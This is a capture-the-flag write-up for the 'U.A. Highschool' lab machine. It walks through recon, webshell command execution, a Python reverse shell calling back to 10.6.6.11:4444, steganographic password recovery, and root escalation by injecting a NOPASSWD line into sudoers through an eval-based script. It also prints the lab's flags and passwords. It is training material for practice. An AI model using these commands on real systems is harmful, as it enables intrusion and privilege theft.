# U.A. Highschool CTF

## Recon
1. nmap -sS -oN nmap_initial.txt gives us open ssh and http ports. Lets get detail on the http port 
2. nmap -A -p80 -oN nmap_http.txt school.thm we have an apache web server running lets go ahead and look at the website
3. The webiste has a few forms but non seem functional there doesn't seem to be anything interesting in the sorce code.
4. gobuster dir -u http://school.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 reveals only /assets and /server-status
5. Wild goose chase with Japanese word lists
6. the hint says be suspicous of any unused files lets look for files; we find an index.php
7. we have found LFI on index.php

## LFI Exploration

1. http://school.thm/assets/index.php?cmd=whoami gives us d3d3LWRhdGEK
2. base 64 decode shows user is www-data
3. http://school.thm/assets/index.php?cmd=cat /etc/apache2/sites-enabled/000-default.conf reveals some info see apache_conf.txt
4. we are able to reverse shell http://school.thm/assets/index.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.6.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'


## Reverse Shell

1. stabalize with: python3 -c 'import pty; pty.spawn("/bin/bash")'
2. make terminal responsive export TERM=xterm
3. improve input handling: stty raw -echo; fg
4. www-data@myheroacademia:/var/www/html/assets$ whoami && hostname
www-data
myheroacademia
5. www-data@myheroacademia:/var/www/html/assets$ uname -a
Linux myheroacademia 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
6. www-data@myheroacademia:/var/www/html/assets$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
7. www-data@myheroacademia:/var/www/html/assets$ df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  4.7G  4.7G  51% /
udev                               436M     0  436M   0% /dev
tmpfs                              481M     0  481M   0% /dev/shm
tmpfs                               97M  944K   96M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              481M     0  481M   0% /sys/fs/cgroup
/dev/loop0                          64M   64M     0 100% /snap/core20/1828
/dev/loop1                          50M   50M     0 100% /snap/snapd/18357
/dev/loop2                          92M   92M     0 100% /snap/lxd/24061
/dev/xvda2                         1.7G  108M  1.5G   7% /boot
8. /usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/at
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
9. www-data@myheroacademia:/var/www/html/assets$ find / -writable -type f 2>/dev/null
cat /etc/passwd | grep bash/var/www/html/assets/images/yuei.jpg
/var/www/html/assets/images/oneforall.jpg
/var/www/html/assets/index.php
/var/www/html/index.html
/var/www/html/about.html
/var/www/html/admissions.html
/var/www/html/contact.html
/var/www/html/courses.html
/var/www/Hidden_Content/passphrase.txt
10. www-data@myheroacademia:/var/www/html/assets$ cat /var/www/Hidden_Content/passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg== : AllmightForEver!!!
11. www-data@myheroacademia:/var/www/html/assets$ cat /etc/passwd | cut -d: -f1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-network
systemd-resolve
systemd-timesync
messagebus
syslog
_apt
tss
uuidd
tcpdump
landscape
pollinate
fwupd-refresh
usbmux
sshd
systemd-coredump
deku

lxd

11. su - deku fail
12. ssh deku@school.thm fail
13. www-data@myheroacademia:/var/www/html/assets$ cat /etc/shadow | grep deku
cat: /etc/shadow: Permission denied
14. www-data@myheroacademia:/var/www/html/assets$ netstat -tulnp
ps aux | grep deku(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.5.150:68          0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:55490           0.0.0.0:*                           -                   
www-data@myheroacademia:/var/www/html/assets$ 
15. www-data@myheroacademia:/var/www/html/assets$ ls -la /home/deku/
total 36
drwxr-xr-x 5 deku deku 4096 Jul 10  2023 .
drwxr-xr-x 3 root root 4096 Jul  9  2023 ..
lrwxrwxrwx 1 root root    9 Jul  9  2023 .bash_history -> /dev/null
-rw-r--r-- 1 deku deku  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 deku deku 3771 Feb 25  2020 .bashrc
drwx------ 2 deku deku 4096 Jul  9  2023 .cache
drwxrwxr-x 3 deku deku 4096 Jul  9  2023 .local
-rw-r--r-- 1 deku deku  807 Feb 25  2020 .profile
drwx------ 2 deku deku 4096 Jul  9  2023 .ssh
-rw-r--r-- 1 deku deku    0 Jul  9  2023 .sudo_as_admin_successful
-r-------- 1 deku deku   33 Jul 10  2023 user.txt
16 we found the flag but:
www-data@myheroacademia:/var/www/html/assets$ cat /home/deku/user.txt
cat: /home/deku/user.txt: Permission denied
17. ww-data@myheroacademia:/var/www/html/assets$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/at
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
18. looking back at the hint unused files : 
www-data@myheroacademia:/var/www/html/assets$ ls -la images/
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
oneforall.jpg isn't used on the site

## Image Examination

1. download image wget http://school.thm/assets/images/oneforall.jpg
2. exiftool oneforall.jpg > exif.txt it appears to be a .png file not .jpg
3. pngcheck -v oneforall.png
File: oneforall.png (98264 bytes)
  invalid chunk name "" (01 00 00 01)
ERRORS DETECTED in oneforall.png
4. file oneforall.png 
oneforall.png: data
5. hexedit to switch to jpg : 
file oneforall.jpg
oneforall.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1140x570, components 3
6. steghide extract -sf oneforall.jpg
Enter passphrase: AllmightForEver!!!
wrote extracted data to "creds.txt"
7. password found: One?For?All_!!one1/A

## Get User Flag

1. ssh deku@school.thm with the new password, success!
2. deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
3. deku@myheroacademia:~$ find / -name "user.txt" 2>/dev/null
/home/deku/user.txt
4. deku@myheroacademia:~$ cat user.txt 
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}

## Privilege Escalation

1. deku@myheroacademia:~$ cat /opt/NewComponent/feedback.sh 
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi

2. deku@myheroacademia:~$ $(id)
uid=1000(deku): command not found
3. deku@myheroacademia:~$ echo 'Test' > /tmp/hacked
deku@myheroacademia:~$ 
4. deku@myheroacademia:~$ echo 'This one has seen the stars $(whoami)' >> /var/log/feedback.txt
5. deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
[sudo] password for deku: 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
iamnothackingyurstuff
It is This:
iamnothackingyurstuff
Feedback successfully saved.
6. echo 'eval $(id)' | sudo /opt/NewComponent/feedback.sh  NOPE
7. deku@myheroacademia:~$ export HACKME='$(id)'
deku@myheroacademia:~$ echo "$HACKME" | sudo /opt/NewComponent/feedback.sh NOPE
8. echo '$(     id)' | sudo /opt/NewComponent/feedback.sh NOPE
9. deku@myheroacademia:~$ echo 'id' >> /var/log/feedback.txt 
deku@myheroacademia:~$ sudo bash /var/log/feedback.txt
Sorry, user deku is not allowed to execute '/usr/bin/bash /var/log/feedback.txt' as root on myheroacademia.
10. deku@myheroacademia:~$ ls -la /opt/NewComponent/feedback.sh
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 /opt/NewComponent/feedback.sh
11. eku@myheroacademia:~$ find / -type d -perm -o+w 2>/dev/null
/var/crash
/var/tmp
/var/lib/php/sessions
/run/screen
/run/lock
/tmp
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/dev/mqueue
/dev/shm
/snap/core20/1828/run/lock
/snap/core20/1828/tmp
/snap/core20/1828/var/tmp

12. eku@myheroacademia:~$ echo 'echo Vulnerability Check' | sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
It is This:
echo Vulnerability Check
Feedback successfully saved.

13. deku@myheroacademia:~$ grep -E "sh|bash|exec" /opt/NewComponent/feedback.sh
#!/bin/bash

14. deku@myheroacademia:~$ echo 'ls /root' | sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
It is This:
ls /root
Feedback successfully saved.

15. deku@myheroacademia:~$ grep "/bin/" /opt/NewComponent/feedback.sh
#!/bin/bash

16. deku@myheroacademia:~$ echo '#!/bin/bash' > /tmp/echo
deku@myheroacademia:~$ echo 'id' >> /tmp/echo
deku@myheroacademia:~$ chmod +x /tmp/echo
deku@myheroacademia:~$ PATH=/tmp:$PATH sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
ok
It is This:
ok
Feedback successfully saved.

17. s -la /usr/bin/passwd /usr/bin/su /usr/bin/pkexec
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 67816 Feb  7  2022 /usr/bin/su


18. do passwd root
[sudo] password for deku: 
Sorry, user deku is not allowed to execute '/usr/bin/passwd root' as root on myheroacademia.

19. deku@myheroacademia:~$ sudo su
[sudo] password for deku: 
Sorry, user deku is not allowed to execute '/usr/bin/su' as root on myheroacademia.

20. deku@myheroacademia:~$ ps aux | grep root
root           1  0.0  1.1 104500 11496 ?        Ss   15:25   0:01 /sbin/init splash noprompt noshell automatic-ubiquity vt.handoff=7 console=ttyS0
root           2  0.0  0.0      0     0 ?        S    15:25   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   15:25   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   15:25   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   15:25   0:00 [kworker/0:0H-kblockd]
root           8  0.0  0.0      0     0 ?        I<   15:25   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    15:25   0:00 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        I    15:25   0:00 [rcu_sched]
root          11  0.0  0.0      0     0 ?        S    15:25   0:00 [migration/0]
root          12  0.0  0.0      0     0 ?        S    15:25   0:00 [idle_inject/0]
root          14  0.0  0.0      0     0 ?        S    15:25   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    15:25   0:00 [kdevtmpfs]
root          16  0.0  0.0      0     0 ?        I<   15:25   0:00 [netns]
root          17  0.0  0.0      0     0 ?        S    15:25   0:00 [rcu_tasks_kthre]
root          18  0.0  0.0      0     0 ?        S    15:25   0:00 [kauditd]
root          19  0.0  0.0      0     0 ?        S    15:25   0:00 [khungtaskd]
root          20  0.0  0.0      0     0 ?        S    15:25   0:00 [oom_reaper]
root          21  0.0  0.0      0     0 ?        I<   15:25   0:00 [writeback]
root          22  0.0  0.0      0     0 ?        S    15:25   0:00 [kcompactd0]
root          23  0.0  0.0      0     0 ?        SN   15:25   0:00 [ksmd]
root          24  0.0  0.0      0     0 ?        SN   15:25   0:00 [khugepaged]
root          70  0.0  0.0      0     0 ?        I<   15:25   0:00 [kintegrityd]
root          71  0.0  0.0      0     0 ?        I<   15:25   0:00 [kblockd]
root          72  0.0  0.0      0     0 ?        I<   15:25   0:00 [blkcg_punt_bio]
root          73  0.0  0.0      0     0 ?        S    15:25   0:00 [xen-balloon]
root          74  0.0  0.0      0     0 ?        I<   15:25   0:00 [tpm_dev_wq]
root          75  0.0  0.0      0     0 ?        I<   15:25   0:00 [ata_sff]
root          76  0.0  0.0      0     0 ?        I<   15:25   0:00 [md]
root          77  0.0  0.0      0     0 ?        I<   15:25   0:00 [edac-poller]
root          78  0.0  0.0      0     0 ?        I<   15:25   0:00 [devfreq_wq]
root          79  0.0  0.0      0     0 ?        S    15:25   0:00 [watchdogd]
root          82  0.0  0.0      0     0 ?        S    15:25   0:00 [kswapd0]
root          83  0.0  0.0      0     0 ?        S    15:25   0:00 [ecryptfs-kthrea]
root          85  0.0  0.0      0     0 ?        I<   15:25   0:00 [kthrotld]
root          86  0.0  0.0      0     0 ?        I<   15:25   0:00 [acpi_thermal_pm]
root          87  0.0  0.0      0     0 ?        S    15:25   0:00 [xenbus]
root          88  0.0  0.0      0     0 ?        S    15:25   0:00 [xenwatch]
root          89  0.0  0.0      0     0 ?        S    15:25   0:00 [scsi_eh_0]
root          90  0.0  0.0      0     0 ?        I<   15:25   0:00 [scsi_tmf_0]
root          91  0.0  0.0      0     0 ?        S    15:25   0:00 [scsi_eh_1]
root          92  0.0  0.0      0     0 ?        I<   15:25   0:00 [scsi_tmf_1]
root          94  0.0  0.0      0     0 ?        I<   15:25   0:00 [vfio-irqfd-clea]
root          95  0.0  0.0      0     0 ?        I<   15:25   0:00 [ipv6_addrconf]
root         105  0.0  0.0      0     0 ?        I<   15:25   0:00 [kstrp]
root         108  0.0  0.0      0     0 ?        I<   15:25   0:00 [kworker/u31:0]
root         121  0.0  0.0      0     0 ?        I<   15:25   0:00 [kworker/0:1H-kblockd]
root         122  0.0  0.0      0     0 ?        I<   15:25   0:00 [charger_manager]
root         158  0.0  0.0      0     0 ?        I<   15:25   0:00 [cryptd]
root         200  0.0  0.0      0     0 ?        I<   15:25   0:00 [kdmflush]
root         227  0.0  0.0      0     0 ?        I<   15:25   0:00 [raid5wq]
root         275  0.0  0.0      0     0 ?        S    15:25   0:00 [jbd2/dm-0-8]
root         276  0.0  0.0      0     0 ?        I<   15:25   0:00 [ext4-rsv-conver]
root         349  0.0  1.6  68536 15784 ?        S<s  15:25   0:00 /lib/systemd/systemd-journald
root         383  0.0  0.7  23660  7096 ?        Ss   15:25   0:00 /lib/systemd/systemd-udevd
root         519  0.0  0.0      0     0 ?        I<   15:25   0:00 [kaluad]
root         520  0.0  0.0      0     0 ?        I<   15:25   0:00 [kmpath_rdacd]
root         521  0.0  0.0      0     0 ?        I<   15:25   0:00 [kmpathd]
root         522  0.0  0.0      0     0 ?        I<   15:25   0:00 [kmpath_handlerd]
root         523  0.0  1.8 280200 18000 ?        SLsl 15:25   0:00 /sbin/multipathd -d -s
root         534  0.0  0.0      0     0 ?        S<   15:25   0:00 [loop0]
root         537  0.0  0.0      0     0 ?        S<   15:25   0:00 [loop1]
root         538  0.0  0.0      0     0 ?        S<   15:25   0:00 [loop2]
root         544  0.0  0.0      0     0 ?        S    15:25   0:00 [jbd2/xvda2-8]
root         545  0.0  0.0      0     0 ?        I<   15:25   0:00 [ext4-rsv-conver]
root         622  0.0  0.7 235664  7500 ?        Ssl  15:25   0:00 /usr/lib/accountsservice/accounts-daemon
root         623  0.0  1.7 1684088 17168 ?       Ssl  15:25   0:00 /usr/bin/amazon-ssm-agent
root         628  0.0  0.2   6816  2892 ?        Ss   15:25   0:00 /usr/sbin/cron -f
root         637  0.0  1.8  29672 18484 ?        Ss   15:25   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         639  0.0  0.8 234560  8704 ?        Ssl  15:25   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         643  0.0  3.9 727580 38692 ?        Ssl  15:25   0:01 /usr/lib/snapd/snapd
root         645  0.0  0.7  17300  7800 ?        Ss   15:25   0:00 /lib/systemd/systemd-logind
root         648  0.0  1.2 393148 11964 ?        Ssl  15:25   0:00 /usr/lib/udisks2/udisksd
root         712  0.0  0.1   5828  1844 tty1     Ss+  15:25   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         714  0.0  1.1 241380 11168 ?        Ssl  15:25   0:00 /usr/sbin/ModemManager
root         725  0.0  2.0 107924 20676 ?        Ssl  15:25   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         726  0.0  0.7  12176  7012 ?        Ss   15:25   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         755  0.0  1.8 193448 17780 ?        Ss   15:25   0:00 /usr/sbin/apache2 -k start
root        1098  0.0  0.9  13960  8888 ?        Ss   15:29   0:00 sshd: deku [priv]
root        1518  0.0  0.0      0     0 ?        I    16:22   0:01 [kworker/0:0-events]
root        1584  0.0  0.0      0     0 ?        I    16:39   0:00 [kworker/0:2]
root        1585  0.0  0.0      0     0 ?        I    16:39   0:00 [kworker/u30:2-events_power_efficient]
root        1591  0.0  0.0      0     0 ?        I    16:56   0:00 [kworker/u30:0-events_unbound]
deku        1602  0.0  0.0   6432   656 pts/0    S+   17:06   0:00 grep --color=auto root
deku@myheroacademia:~$ 

21. deku@myheroacademia:~$ sudo cat /etc/crontab
[sudo] password for deku: 
Sorry, user deku is not allowed to execute '/usr/bin/cat /etc/crontab' as root on myheroacademia.

22. deku@myheroacademia:~$ echo 'root:$6$HASHEDPASSWORD:0:0:root:/root:/bin/bash' >> /etc/passwd
-bash: /etc/passwd: Permission denied

23. deku@myheroacademia:~$ chsh -s /bin/sh
Password: 
deku@myheroacademia:~$ whoami
deku
deku@myheroacademia:~$ 

24. deku@myheroacademia:~$ pkexec --version
pkexec version 0.105

25. deku@myheroacademia:~$ mount -o bind /bin/bash /mnt
mount: only root can use "--options" option

26. deku@myheroacademia:~$ echo "/bin/bash" | at now
warning: commands will be executed using /bin/sh
job 1 at Wed Apr 23 17:14:00 2025

27. deku@myheroacademia:~$ lsattr /opt/NewComponent/feedback.sh
----i---------e----- /opt/NewComponent/feedback.sh
deku@myheroacademia:~$ 

28. deku@myheroacademia:~$ chattr -i /opt/NewComponent/feedback.sh
chattr: Operation not permitted while setting flags on /opt/NewComponent/feedback.sh

29. deku@myheroacademia:~$ find / -type d -perm -o+w 2>/dev/null
/var/crash
/var/tmp
/var/lib/php/sessions
/run/screen
/run/lock
/tmp
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/dev/mqueue
/dev/shm
/snap/core20/1828/run/lock
/snap/core20/1828/tmp
/snap/core20/1828/var/tmp

30. deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh
[sudo] password for deku: 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.

31. deku@myheroacademia:/opt/NewComponent$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL

32. deku@myheroacademia:~$ sudo /bin/bash
root@myheroacademia:/home/deku# 

33. root@myheroacademia:~# ls
root.txt  snap

34. root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{Y0U_4r3_7h3_NUm83r_1_H3r0}

